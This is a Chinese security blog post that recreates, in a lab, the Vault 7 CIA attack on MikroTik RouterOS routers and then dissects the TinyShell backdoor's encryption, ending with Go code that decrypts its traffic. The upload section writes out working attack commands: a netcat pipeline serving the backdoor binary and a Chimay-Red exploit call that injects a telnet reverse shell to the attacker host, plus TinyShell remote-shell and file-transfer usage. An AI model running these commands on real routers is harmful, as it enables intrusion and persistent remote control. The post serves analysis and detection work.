#  CIA组织MikroTik软路由攻击场景复现及后门加解密剖析   
原创 T0daySeeker  T0daySeeker   2024-04-25 19:23  
  
```
文章首发地址：
https://xz.aliyun.com/t/14361
文章首发作者：
T0daySeeker

```  
## 概述  
  
写文章还是有一段时间了，发布的文章也是获得了不少小伙伴的关注，同时也和圈子里面的小伙伴慢慢的建立起了联系，平时也会时不时的一起探讨一些技术问题。因此，在最近和小伙伴的交流学习过程中，有一个小伙伴提到了一款远控工具，名字叫tinyshell：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrGxGxlANMmFHjax6XvibYuMdTZibBRKC7PY6Gy3EuTkIILrVRPnILcrBUg/640?wx_fmt=png&from=appmsg "")  
  
刚听到此远控工具的名字，确实感觉没什么映像，不过尝试在网络中搜索了一下此工具，发现此工具是一款轻量级网络设备后门程序，而且其曾被CIA组织所青睐，配合Chimay Red漏洞利用工具对MikroTik路由器发起攻击。相关截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrGk9P0gAibibicpPFBM71WQIkAFNLhgpdqmy446iaSD65NywXHz9YFTfxyOg/640?wx_fmt=png&from=appmsg "")  
  
尝试对上述网页进行详细解读，发现此网页为“Vault 7” CIA泄露文档，由维基解密于2017年曝光。基于网络调研信息，发现“Vault 7” CIA泄露文档共计8700余份机密文件，是CIA组织针对外国政府和国内外公民的黑客工具库。  
  
进一步对“Vault 7” CIA泄露文档进行调研，发现泄露文件揭秘了CIA组织在海外间谍活动中如何入侵Android、iPhone、三星电视、Windows PC、Mac、**「MikroTik」**和其它设备，并详细说明该机构尝试将相关设备变成监听设备的行为。  
  
上述文档即为CIA组织利用MikroTik路由器的详细过程，在其利用过程中，将使用Chimay Red漏洞利用工具向MikroTik路由器上传TinyShell后门开展远程恶意行为。  
  
因此，为了能够更深入的对CIA组织的攻击活动进行剖析，笔者准备从如下几个角度复现CIA组织针对MikroTik路由器的攻击场景及攻击利用过程中的TinyShell后门技术原理：  
- 构建MikroTik路由器漏洞利用套件  
  
- MikroTik路由器攻击场景复现  
  
- TinyShell后门功能分析  
  
- TinyShell后门通信模型剖析  
  
- 模拟构建通信解密程序  
  
## MikroTik路由器漏洞利用套件  
  
为了能够完整复现CIA组织针对MikroTik路由器的攻击场景，需要准备如下漏洞利用套件：  
- MikroTik虚拟机：MikroTik RouterOS系统支持通过VMware虚拟机安装使用  
  
- Chimay-Red：Chimay-Red是Vault 7泄露文件中提及的针对MikroTik RouterOS系统中www程序的一个漏洞利用工具  
  
- TinyShell轻量级网络设备后门：TinyShell后门是Vault 7泄露文件中提及的后门程序  
  
### 环境搭建-MikroTik虚拟机  
  
MikroTik虚拟机的环境搭建可参考社区hackedbylh大佬的《一步一步 Pwn RouterOS之调试环境搭建&&漏洞分析&&poc》文章，MikroTik系统版本选择**「6.38.4」**，部分关键步骤截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrGK8PR0MAjRHicQ9CcTrowKleVZQbWTAaBic9HTZSZyTn9pZ9ppHtq1EcA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrGNJYs8Ztuia6jib56UIHtxic7k9ibcuT9cicwNSc2zYAcV167NnaIYZleB0Q/640?wx_fmt=png&from=appmsg "")  
  
成功安装后，可通过以下登录信息及配置命令配置IP地址：  
```
#登录信息
用户名：admin
密码：空
#配置命令
ip address
add 

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrGy7rApjwy6pA8MKq6NgWgxxaZe8ZoKXMAmTM6NFmEWjQ4LDT6CFyrGw/640?wx_fmt=png&from=appmsg "")  
  
IP配置成功后，可基于WEB成功访问MikroTik路由器页面，相关截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrGwOkXApYicomEZdBoX7D3KONbkegSXJPVXy2a47eyRBQzfjk9wePpK1g/640?wx_fmt=png&from=appmsg "")  
### 漏洞工具套件-Chimay-Red  
  
通过网络调研，笔者在Github的https://github.com/BigNerd95/Chimay-Red项目中发现了Vault 7泄露资料中对应的Mikrotik exploit，相关截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrGy5meSoj3Acjd1V2VRknq4sbERIzd36shrgyKD8Mjiak8icgn2TG0C7Ow/640?wx_fmt=png&from=appmsg "")  
### 漏洞工具套件-TinyShell轻量级网络设备后门  
  
通过网络调研，笔者在Github上发现了11年前的TinyShell开源项目（https://github.com/orangetw/tsh）。由于开源项目提供了源代码，同时笔者将此开源项目与维基解密中CIA Vault 7泄露资料描述进行了对比，发现其命令行有些许不同，因此，笔者推测CIA组织使用的TinyShell是基于开源TinyShell项目修改的。相关对比截图如下：  
- CIA Vault 7泄露资料描述  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrGE1NLnhibD36Dg8KIWmAshpldc2CicaFTP1t3rSxZRWXnq67xtYCIU3rw/640?wx_fmt=png&from=appmsg "")  
- 开源TinyShell项目  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrGvPcVIQ0035jKyU5cwUFhevDicSwAtoiccXyUCziazP2kZP9dqYz7ia5Dnw/640?wx_fmt=png&from=appmsg "")  
  
进一步对此工具进行剖析，发现其由C语言编写，体积小（在kali系统上编译后只有55K大小)。分为客户端和服务端（后门），支持正向连接模式（即服务端在远程运行，攻击者远程直接连接）和反弹连接模式（攻击者在自己服务器监听，服务端连接攻击者机器的监听端口），详细情况如下：  
#### 编译  
- 静态编译：**「TinyShell开源项目默认是动态编译的，为了能够在MikroTik环境中正常运行，建议将其修改为静态编译」**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrGMJSWBEBCSNZOqibURWUradyQvs8t6knIhZW5H8BeK9u9SHtze2OiclNQ/640?wx_fmt=png&from=appmsg "")  
- 正向连接：修改tsh.h文件中的配置信息，将C&C地址注释，即可成功编译获得正向连接模式的TinyShell程序  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrGj67ZM0Qe4WK6USgFKMscsJ03SibGwUY0PEHaYaFBF09PruUHD8yic0WA/640?wx_fmt=png&from=appmsg "")  
- 反向连接：修改tsh.h文件中的配置信息，配置C&C地址信息，即可成功编译获得反向连接模式的TinyShell程序  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrGx0XyLq81Zzdpom7vtiaX343ZH8SxQ8dAtacibrLEf2BqTtTIF3n5YxFg/640?wx_fmt=png&from=appmsg "")  
#### 使用方法  
  
基于TinyShell项目介绍，梳理TinyShell的使用方法如下：  
```
#******************正向连接******************
#被控端
umask 077; HOME=/var/tmp
./tshd

#控制端
./tsh 192.168.109.200

./tsh 192.168.109.200 get /home/kali/Desktop/1.txt /home/kali/Desktop/

./tsh 192.168.109.200 put /home/kali/Desktop/2.txt /home/kali/Desktop/

#******************反向连接******************
#控制端
./tsh cb

./tsh cb get /home/kali/Desktop/1.txt /home/kali/Desktop/

./tsh cb put /home/kali/Desktop/2.txt /home/kali/Desktop/

#被控端
umask 077; HOME=/var/tmp
./tshd

```  
## MikroTik路由器攻击场景复现  
  
参考“Vault 7” CIA泄露文档，梳理CIA组织针对MikroTik路由器的攻击流程如下：  
- 使用Chimay-Red漏洞利用工具上传TinyShell后门  
  
- 使用TinyShell控制端连接TinyShell后门  
  
- 运行指令确认是否具有shell权限  
  
- 上传busybox至MikroTik系统  
  
- 使用TinyShell控制端连接TinyShell后门  
  
- 基于busybox程序在MikroTik系统中开展恶意行为  
  
“Vault 7” CIA泄露文档截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrGLAasDuwC5btFouXAg0IF486PHRKELv1Q0CxBxAGQiaAJkjicw8clwJNw/640?wx_fmt=png&from=appmsg "")  
### 上传并执行TinyShell后门  
  
使用Chimay-Red漏洞利用工具执行如下指令即可实现上传并执行TinyShell后门：  
```
{ echo "echo Uploading..."; hexdump -v -e '"echo -e -n " 1024/1 "\\\\x%02X" " >> /ram/bash\n"' tshd | sed -e "s/\\\\\\\\x  //g";echo "chmod 777 /ram/bash";echo "./ram/bash"; } | nc -l -q 0 -p 2345;


./StackClash_x86.py 192.168.109.200 80 www_binary "/bin/mknod /ram/f p; /bin/telnet 192.168.109.140 2345 < /ram/f | /bin/bash > /ram/f"

```  
  
相关操作截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrGyxaVcAu6BeicZLZx5GvJAanUCtQgormBpC0uNVurPXR9KqXDGcHxPXg/640?wx_fmt=png&from=appmsg "")  
### 连接TinyShell确认权限  
  
由于TinyShell使用的是正向连接模式，因此直接使用tsh控制端即可连接TinyShell后门：  
```
./tsh 192.168.109.200

```  
  
相关操作截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrGNslEgZr2u7zNyYckGyLq20hAsPkopdnpGibibWJIjQX96FicKKibxz0khA/640?wx_fmt=png&from=appmsg "")  
### 上传busybox  
  
**「由于MikroTik系统内置的shell指令较少，因此需要上传busybox程序丰富MikroTik系统的shell指令。」**  
  
使用TinyShell后门的上传文件功能，即可有效上传busybox程序：  
```
./tsh 192.168.109.200 put busybox-i486 /ram/

```  
  
相关操作截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrGf462RTiaiax1GmotutOraaJhgMoMPiaOPqxVQxb13XeXhicpBpYicpOXauQ/640?wx_fmt=png&from=appmsg "")  
### 连接TinyShell进行远程控制  
  
成功上传busybox程序后，我们即可借助busybox程序中集成的shell指令开展恶意行为活动：  
```
./tsh 192.168.109.200
cd /ram/
chmod 777 busybox-i486
busybox-i486

```  
  
相关操作截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrGicBuBswtjibmN5piaicGdDpyCGCice1q3hV1KdQzcNzy6TsulrAXeibn1ic7Q/640?wx_fmt=png&from=appmsg "")  
### 为什么不使用Chimay-Red的shell功能而使用TinyShell后门？  
  
其实，在这里，可能会有小伙伴有疑问：就是Chimay-Red支持shell功能，但是为什么我们不使用它的shell功能，而要使用TinyShell后门呢？  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrGydwuw8ia3ialwZZ9e6NHTbP23rgUjMliaxdtJenYocFvGq7H4fic4VIxvw/640?wx_fmt=png&from=appmsg "")  
  
通过实际使用Chimay-Red的shell功能及TinyShell后门，笔者将其做了如下对比：  
- Chimay-Red的shell功能的通信数据包是明文传输的；  
  
- Chimay-Red的shell功能的操作不是很方便，若需要上传文件等行为，则需要退出shell，再调用Chimay-Red上传文件；  
  
- TinyShell后门的通信数据包是加密传输的；  
  
- TinyShell后门支持命令自动补全等特性，且支持上传、下载文件功能。  
  
Chimay-Red的shell功能的通信数据包截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrGryVNNXyJT2rmFx664cTzpAJkHH3zgvqyZQ5Cicb5ia1QwUp5MXFsibdPg/640?wx_fmt=png&from=appmsg "")  
## TinyShell后门功能分析  
  
通过分析，发现TinyShell的功能其实很简单，可能是为了更好的兼容并适配各种类型的网络设备环境吧，因此其只具备基本的shell功能及上传/下载文件功能。  
### 下载文件  
  
通过对TinyShell的源码进行剖析，发现tshd_get_file函数为下载文件功能函数，此外，为了更完整的对不同环境下的TinyShell程序进行剖析，笔者还将动态编译及静态编译下的TinyShell反编译代码进行了对比，详细情况如下：  
- 源码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrG2rIqzsokzibTPz6oWKtcaVZ8oXMSRWX48yVbKk5OS1DlicA0sLicNNiaXQ/640?wx_fmt=png&from=appmsg "")  
- 动态编译  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrGprC0oU7K5lSn6LV6mcSESoZddSZwb1Tibtvvo6j8mj6Gq8icSIIHt5eg/640?wx_fmt=png&from=appmsg "")  
- 静态编译  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrGmibofo393208c25BnGK6KmsnZB9DlRk6WicZ6Sibsbr885EicRSkVVaVKw/640?wx_fmt=png&from=appmsg "")  
### 上传文件  
  
通过对TinyShell的源码进行剖析，发现tshd_put_file函数为上传文件功能函数，此外，为了更完整的对不同环境下的TinyShell程序进行剖析，笔者还将动态编译及静态编译下的TinyShell反编译代码进行了对比，详细情况如下：  
- 源码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrGxZapK3RicuzicoxQTOMYfVvQILOv2aHWUQP1LNMJaSWtkibnh92XWSAVg/640?wx_fmt=png&from=appmsg "")  
- 动态编译  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrGptiaOE3icUmvv03jtGIODUVtlaHDIuOBAEvE2bZIhcwvHia0oI4VicuECA/640?wx_fmt=png&from=appmsg "")  
- 静态编译  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrGdVuFhGzJiby3qMRtfv179NlvwTTuToM2KaXMzBc1NDOib05SQbibicOIOg/640?wx_fmt=png&from=appmsg "")  
### 执行shell  
  
通过对TinyShell的源码进行剖析，发现tshd_runshell函数为执行shell功能函数，此外，为了更完整的对不同环境下的TinyShell程序进行剖析，笔者还将动态编译及静态编译下的TinyShell反编译代码进行了对比，详细情况如下：  
- 源码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrGCVtBk7rAUByicFZ7IdKwkUAGf3y8VllNacWIOlwWEqGBEjFjDkmxUug/640?wx_fmt=png&from=appmsg "")  
- 动态编译  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrG7BDibFOLuPMy3SLBcaJRccr3DY5IPlnfo8DK0zIyxlJicEF6Ww88ibL8w/640?wx_fmt=png&from=appmsg "")  
- 静态编译  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrGicmwWVDG1cerZic7lnWvBw6aNlvTibFpoYuhjxVdGdxNgeJwHj5Otd4sQ/640?wx_fmt=png&from=appmsg "")  
### 外联通信  
  
通过对TinyShell的源码进行剖析，发现pel_send_msg、pel_recv_msg函数为外联通信函数；进一步分析，发现其通信函数中将调用SHA1算法，因此可在其反编译代码中基于SHA1算法的算子快速定位其通信函数，相关情况如下：  
- 源码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrG8YPeg1ZcltiaErpZToicCrd9sUxvWueXGmICGDyTxbpsRN5p0vLCiazfg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrGYGRPBZmACxG95Jh8Th0Lqwjsy8FIOFZY8LqU4yXEGYVf856YdrXxibA/640?wx_fmt=png&from=appmsg "")  
- 动态编译-pel_send_msg  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrGicWn738CJIbCibicJdW1xXYsvEicblQ5R0ibFx50tZ8ZYu47Q6oV5uDVic6w/640?wx_fmt=png&from=appmsg "")  
- 动态编译-pel_recv_msg  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrGXZmnlnicm9RBbcXpvnY6kf0bkgiaT3epAcQ0bqRFYPlL3e1xzUDccG9w/640?wx_fmt=png&from=appmsg "")  
## TinyShell后门通信模型剖析  
  
通过对TinyShell后门的外联通信函数进行剖析，梳理其通信过程如下：  
- 调用gettimeofday函数及getpid函数获取当前时间tv及进程pid，将tv和pid作为SHA1算法的输入，生成得到**「20字节的IV1数据」**  
  
- 调用gettimeofday函数及pid++获取tv及pid，将tv和pid作为SHA1算法的输入，生成得到**「20字节的IV2数据」**  
  
- 使用socket套接字发送**「40字节的IV1+IV2数据」**  
  
- 提取内置的**「key字符串信息」**（tsh.h文件中的secret数据）  
  
- 初始化发送数据及接收数据的session key信息  
  
- 将key字符串信息及IV1数据作SHA1运算，取**「16字节」**作为发送数据时AES算法的**「AES key」**  
  
- 将key字符串信息及IV2数据作SHA1运算，取**「16字节」**作为接收数据时AES算法的**「AES key」**  
  
- 取IV1数据的前**「16字节」**作为第一次发送数据时的**「AES iv」**  
  
- 取IV2数据的前**「16字节」**作为第一次接收数据时的**「AES iv」**  
  
- 控制端与被控端相互发送内置的challenge数据（\x58\x90\xAE\x86\xF1\xB9\x1C\xF6\x29\x83\x95\x71\x1D\xDE\x58\x0D），用于校验通信是否建立成功  
  
- 发送数据时，每16字节进行一次AES运算，前16字节的加密结果将作为第二段数据加密的IV值  
  
- 通信数据结构  
  
- 2字节数据：后续实际载荷长度  
  
- 实际载荷数据  
  
实际通信数据包截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrGSgOicDwicncaQoNxz2licubgjthoyxY8fa7H8dvLxS6jrZAd7KFTqkwpw/640?wx_fmt=png&from=appmsg "")  
  
实际通信数据包案例剖析：  
```
#************第一个通信数据包 tsh -> tshd
b1180d0d0b5c3cd49366af469c313586e29bd96111bae610609d82c733f8b10767e4b0627570ce5f

b1180d0d0b5c3cd49366af469c313586e29bd961 #IV1
11bae610609d82c733f8b10767e4b0627570ce5f #IV2

b1180d0d0b5c3cd49366af469c313586 #初始send_aes_iv
11bae610609d82c733f8b10767e4b062 #初始recv_aes_iv

#************计算send_aes_key
#74696E797368656C6C对应内置的key字符串信息tinyshell
74696E797368656C6C + b1180d0d0b5c3cd49366af469c313586e29bd961

a13e91013d7f4a3ef3a149467af680262c45b141 #SHA1运算结果

a13e91013d7f4a3ef3a149467af68026 #send_aes_key

#************计算recv_aes_key
74696E797368656C6C + 11bae610609d82c733f8b10767e4b0627570ce5f

0813d1deba152c1d2c6dc774293c18ff86f3239b #SHA1运算结果

0813d1deba152c1d2c6dc774293c18ff #recv_aes_key

#************第二个通信数据包 tsh -> tshd
4ff6ac2d77894dbe5355e773c0a6216c8b6fba90ac890c125424c9f3bce4c021cbd0eefd4ea658a45ecfcd49a4efa95177da55e8

00105890ae86f1b91cf6298395711dde580d #AES解密数据
0010 #载荷长度
5890ae86f1b91cf6298395711dde580d #内置的challenge校验数据

#************第三个通信数据包 tshd -> tsh
16516b60fd4b37c540ec7ad3902830c8332393f5a22187147c7cc72e60943c0e36b8a4851cdae3b5058b56af7eed56533743930c

00105890ae86f1b91cf6298395711dde580d #AES解密数据
0010 #载荷长度
5890ae86f1b91cf6298395711dde580d #内置的challenge校验数据

```  
## 模拟构建通信解密程序  
  
为了更便利的对TinyShell后门的通信数据进行解密，笔者尝试编写了一个解密程序，可对TinyShell后门通信数据进行批量解密，解密效果如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrGdQPq4hdcR7QL36EC3NzuKSO5B7icP4VYCJYBIQowtdBA9oKq3tOQ69Q/640?wx_fmt=png&from=appmsg "")  
  
自动化脚本输入文件格式如下：**「（备注：直接从wireshark导出”C Arrays“数据即可）」**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrG50xeAteJ7F3C64rmIgG7ejV1Fnq8r5dceEBzvPAQJpcvMjwxAjdvzA/640?wx_fmt=png&from=appmsg "")  
### 代码实现  
  
代码结构截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9x5wia3o4gwYuErFuQzfpicrG0liccVpLS8EDRCqElWjGtvudZZmd1Cqkv7LiaicrBV9VKKuZtzAZpSKJg/640?wx_fmt=png&from=appmsg "")  
- main.go  
  
```
package main

import (
 "awesomeProject5/common"
 "encoding/hex"
 "fmt"
 "io/ioutil"
 "strings"
)

func main() {
 key := "tinyshell"
 // 读取文件的所有内容
 content, err := ioutil.ReadFile("C:\\Users\\admin\\Desktop\\1.txt")
 if err != nil {
  fmt.Println("Error reading file:", err)
  return
 }
 data := string(content)

 data = strings.ReplaceAll(data, "\n0x", "0x")
 datas := strings.Split(data, "\n")

 lable := strings.Split(datas[0], "_")[0]
 //fmt.Println(lable)
 firstdata := strings.ReplaceAll(strings.Split(strings.Split(datas[0], " };")[0], "*/0x")[1], ", 0x", "")
 firstdata_hex, _ := hex.DecodeString(firstdata)
 if len(firstdata_hex) == 40 {
  send_aes_key := []byte{}
  recv_aes_key := []byte{}
  send_iv := []byte{}
  recv_iv := []byte{}
  send_aes_iv := []byte{}
  recv_aes_iv := []byte{}
  send_iv = append(send_iv, firstdata_hex[:20]...)
  recv_iv = append(recv_iv, firstdata_hex[20:]...)
  send_aes_iv = append(send_aes_iv, send_iv[:16]...)
  recv_aes_iv = append(recv_aes_iv, recv_iv[:16]...)

  send_aes_key = append(send_aes_key, common.CalculateSHA1(append([]byte(key), send_iv...))[:16]...)
  recv_aes_key = append(recv_aes_key, common.CalculateSHA1(append([]byte(key), recv_iv...))[:16]...)
  fmt.Println("send_aes_key:", hex.EncodeToString(send_aes_key))
  fmt.Println("recv_aes_key:", hex.EncodeToString(recv_aes_key))
  fmt.Println("send_aes_iv:", hex.EncodeToString(send_aes_iv))
  fmt.Println("recv_aes_iv:", hex.EncodeToString(recv_aes_iv))

  decryptedText := []byte{}
  for _, str := range datas[1:] {
   if str == "" {
    break
   }
   buf := strings.ReplaceAll(strings.Split(strings.Split(str, " };")[0], "*/0x")[1], ", 0x", "")
   hex_buf, _ := hex.DecodeString(buf)
   if strings.HasPrefix(str, lable) {
    fmt.Println("************send************")
    fmt.Println("Raw Data:", hex.EncodeToString(hex_buf))
    common.Decrypt_msg(hex_buf, send_aes_key, &send_aes_iv)
   } else if strings.HasPrefix(str, "char peer") {
    fmt.Println("************recv************")
    fmt.Println("Raw Data:", hex.EncodeToString(hex_buf))
    common.Decrypt_msg(hex_buf, recv_aes_key, &recv_aes_iv)
    fmt.Println(hex.EncodeToString(decryptedText))
    fmt.Println(string(decryptedText))
   }
  }
 }
}

```  
- common.go  
  
```
package common

import (
 "crypto/aes"
 "crypto/cipher"
 "crypto/sha1"
 "encoding/hex"
 "fmt"
)

func Decrypt_msg(ciphertext []byte, aeskey []byte, aes_iv *[]byte) {
 total_len := 0
 blk_len := 0
 for {
  //前两字节为buffer长度
  tmp := []byte{}
  tmp = append(tmp, ciphertext[total_len:total_len+16]...)
  output, _ := DecryptAES(ciphertext[total_len:total_len+16], aeskey, *aes_iv)
  *aes_iv = tmp
  plaintext_len := (int(output[0]) << 8) + int(output[1])

  if (plaintext_len+2)%16 > 0 {
   blk_len = ((plaintext_len+2)/16+1)*16 + 20
   total_len = total_len + blk_len
  } else {
   blk_len = ((plaintext_len+2)/16)*16 + 20
   total_len = total_len + blk_len
  }
  if blk_len > 0x24 {
   aa := decrypt_pel_msg(ciphertext[total_len-blk_len+16:total_len-20], aeskey, aes_iv)
   output = append(output, aa...)
   buffer := []byte{}
   buffer = append(buffer, output[2:plaintext_len+2]...)
   fmt.Println("hex:", hex.EncodeToString(buffer))
   fmt.Println("string:", string(buffer))
  } else {
   buffer := []byte{}
   buffer = append(buffer, output[2:plaintext_len+2]...)
   fmt.Println("hex:", hex.EncodeToString(buffer))
   fmt.Println("string:", string(buffer))
  }
  if len(ciphertext) == total_len {
   return
  }
 }
}

func decrypt_pel_msg(ciphertext []byte, aeskey []byte, aes_iv *[]byte) (plaintext []byte) {
 if len(ciphertext)%16 == 0 {
  blocks := len(ciphertext) / 16
  buffer := []byte{}
  for i := 0; i < blocks; i++ {
   tmp := []byte{}
   tmp = append(tmp, ciphertext[16*i:16*(i+1)]...)
   output, _ := DecryptAES(ciphertext[16*i:16*(i+1)], aeskey, *aes_iv)
   *aes_iv = tmp
   buffer = append(buffer, output...)
  }
  plaintext = append(plaintext, buffer...)
 }
 return
}

func DecryptAES(ciphertext, key, iv []byte) ([]byte, error) {
 block, err := aes.NewCipher(key)
 if err != nil {
  return nil, err
 }

 if len(ciphertext) < aes.BlockSize {
  return nil, fmt.Errorf("ciphertext too short")
 }

 if len(ciphertext)%aes.BlockSize != 0 {
  return nil, fmt.Errorf("ciphertext is not a multiple of the block size")
 }

 mode := cipher.NewCBCDecrypter(block, iv)
 mode.CryptBlocks(ciphertext, ciphertext)

 return ciphertext, nil
}

func CalculateSHA1(input []byte) []byte {
 hasher := sha1.New()

 hasher.Write(input)
 hashBytes := hasher.Sum(nil)

 return hashBytes
}

```  
  
  
  
